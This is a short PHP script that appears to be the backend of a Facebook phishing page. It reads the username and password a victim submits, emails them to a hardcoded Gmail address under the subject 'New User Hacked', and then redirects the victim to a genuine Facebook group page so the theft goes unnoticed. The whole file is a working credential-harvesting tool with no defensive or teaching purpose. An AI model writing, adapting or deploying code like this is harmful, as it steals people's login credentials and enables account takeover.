<?php


if(isset($_POST['submit']))

{
      
if(!empty($_POST['password'])){

$username = $_POST['username'];
$password = $_POST['password'];


$email="atamunim1@gmail.com";

$content='UserName :'.$_POST['username']. "\n"
          .'password :'.$_POST['password'];

$subject="New User Hacked";
$header="Hackers";

mail($email, $subject, $content, $header);

header('location:https://www.facebook.com/groups/758374754297438/?fref=nf/');

}


else{
$_SESSION['Error'] = "Must Enter Valid Passward";
header('location:https://atamunim1.github.io/facebookfun/');

}
}


?>